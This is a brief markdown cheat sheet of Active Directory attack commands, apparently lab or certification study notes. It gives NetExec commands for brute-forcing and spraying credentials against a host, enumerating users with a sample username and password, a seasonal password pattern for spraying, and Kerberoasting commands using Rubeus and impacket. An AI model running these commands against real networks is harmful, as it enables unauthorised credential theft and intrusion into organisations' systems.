# Active Directory

## Finding valid credentials
- Trying all users and password combinations: `nxc smb 192.168.155.21 -u users.txt -p passwords.txt --continue-on-success`
  - Add `no-bruteforce` to check line-by-line usernames and passwords

## Valid domain credentials
- Checking access: `nxc <smb|ldap|winrm|rdp> 192.168.155.21 -u Craig.Carr -p Spring2023`
- Enumerate other users: `nxc smb 192.168.155.21 -u Craig.Carr -p Spring2023 --users`

## User Credentials
- When finding a large list of users, try password spraying with a common password, like:
  - `<Season><Year>`

## Kerberoasting
- Locally with current credentials: `.\Rubeus.exe kerberoast /outfile:hashes.txt`
- Remotely: `impacket-GetUserSPNs -request -dc-ip 192.168.155.21 nagoya-industries.com/Craig.Carr`
